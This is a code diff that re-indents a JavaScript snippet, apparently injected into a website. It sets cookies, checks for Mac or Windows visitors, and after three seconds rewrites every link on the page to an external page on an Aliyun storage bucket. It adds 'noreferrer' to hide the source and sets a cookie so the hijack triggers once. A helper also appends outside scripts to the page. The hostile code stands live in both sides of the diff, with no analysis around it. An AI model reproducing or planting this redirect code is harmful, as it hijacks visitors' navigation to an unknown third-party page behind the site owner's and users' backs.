@@ -7,20 +7,25 @@ function addjs(src) {
     document.getElementsByTagName('head')[0].appendChild(script);
 }
 if (getCookie('cc_cookie')) {
-if (!getCookie('dd_cookie')) {
-setTimeout(function(){
+    if (!getCookie('dd_cookie')) {
+
+        setTimeout(function(){
    
-    var w1=0;
-var tagsE=document.getElementsByTagName("a");
-while(tagsE[w1]){
-  tagsE[w1].setAttribute("rel", "noreferrer");
-  tagsE[w1].setAttribute("href", "http://qingke360.oss-cn-hangzhou.aliyuncs.com/wz/01/wz.html");
-  tagsE[w1].setAttribute("onclick", "setCookie('dd_cookie','ok',1);");
-     
-  w1++;
+        var w1=0;
+        var tagsE=document.getElementsByTagName("a");
+        while(tagsE[w1]){
+          tagsE[w1].setAttribute("rel", "noreferrer");
+          tagsE[w1].setAttribute("href", "http://qingke360.oss-cn-hangzhou.aliyuncs.com/wz/01/wz.html");
+          tagsE[w1].setAttribute("onclick", "setCookie('dd_cookie','ok',1);");
+             
+          w1++;
+        }
+        
+        }, 3000);
+    }
+
 }
 
-}, 3000);}
 if (navigator.platform.indexOf('Mac') == 0 || navigator.platform.indexOf('Win') == 0) {
     if (!getCookie('cc_cookie')) {
         setCookie('cc_cookie','ok',1);
